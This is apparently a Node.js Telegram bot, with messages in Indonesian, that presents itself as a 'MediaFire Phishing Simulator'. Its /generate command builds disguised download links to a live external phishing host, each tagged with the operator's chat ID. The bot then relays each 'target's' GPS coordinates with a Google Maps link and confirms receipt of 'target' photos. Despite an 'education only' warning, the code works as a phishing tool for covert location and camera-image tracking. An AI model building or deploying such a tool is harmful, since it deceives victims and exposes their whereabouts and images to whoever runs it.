const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();


const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token, {polling: true});


const PHISHING_URL = "https://Infoseputardunia.rf.gd/index.html";


bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const message = `🔒 *MediaFire Phishing Simulator*\n\n`
                 + `Gunakan perintah /generate untuk membuat link phishing edukasi.`;
    
    bot.sendMessage(chatId, message, {
        parse_mode: 'Markdown'
    });
});


bot.onText(/\/generate/, (msg) => {
    const chatId = msg.chat.id;
    const uniqueId = Math.random().toString(36).substring(2, 10);
    
  
    const phishingLink = `${PHISHING_URL}/?chat_id=${chatId}&ref=${uniqueId}&auto=true`;
    
    const message = `🔗 *Phishing Link Created*\n\n`
                 + `Berikut link untuk edukasi keamanan digital:\n`
                 + `[Klik di sini untuk mulai download](${phishingLink})\n\n`
                 + `⚠️ *PERINGATAN:* Ini hanya untuk tujuan edukasi. Jangan disalahgunakan!`;
    
    bot.sendMessage(chatId, message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: false
    });
});


bot.on('message', (msg) => {
    if (msg.location) {
        const chatId = msg.chat.id;
        const lat = msg.location.latitude;
        const lon = msg.location.longitude;
        
        bot.sendMessage(chatId, `📍 *Lokasi Target*:\n- Latitude: ${lat}\n- Longitude: ${lon}\n\n[Lihat di Google Maps](https://www.google.com/maps?q=${lat},${lon})`, {
            parse_mode: 'Markdown'
        });
    }
    
    
    if (msg.photo) {
        const chatId = msg.chat.id;
        bot.sendMessage(chatId, '📸 Foto target berhasil diterima!');
    }
});

console.log("Bot Telegram berjalan...");
